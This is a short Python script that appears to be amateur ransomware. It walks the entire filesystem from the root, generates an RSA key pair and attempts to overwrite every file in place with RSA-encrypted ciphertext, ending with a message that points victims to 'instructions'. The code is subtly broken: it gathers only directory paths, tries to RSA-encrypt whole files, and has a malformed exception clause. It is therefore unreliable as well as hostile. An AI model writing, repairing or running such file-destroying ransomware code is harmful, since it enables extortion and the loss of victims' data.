import os, hashlib
from cryptography.hazmat.primitives.asymmetric import rsa, padding, utils
from cryptography.hazmat.primitives import serialization, hashes


def find_directories():
    root_directory = '/'
    directories = []
    for dirpath, dirnames, filenames in os.walk(root_directory):
        directories.append(dirpath)
    return directories
def encryption():
    #generate keys
    key = rsa.generate_private_key(
        public_exponent = 65537,
        key_size = 2048
    )
    print(str(key))
    #get the public key 
    public_key = key.public_key()
    print(str(public_key))
    #serialize the public key
    public_key_bytes = public_key.public_bytes(
        encoding= serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
    #write the public key
    with open("public_key.pem", "wb") as f:
        f.write(public_key_bytes)
    dir = []
    dir = find_directories()
    #encrypting the files with the public key
    try:
        for path in dir:
            if os.path.isfile(path):
                with open(path, "rb+") as f:
                    plaintext = f.read()
                    ciphertext = public_key.encrypt(
                        plaintext,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(), 
                            label=None
                        )
                    )
                    f.seek(0)
                    f.write(ciphertext)
                    f.truncate()
                    print(f" Encrypted {path}")
    except IOError or OSError() as e:
        print(e)
        print("dont have perms ")
    else:
        print("Every file was encrypted consult the instructions for further notice")
encryption()
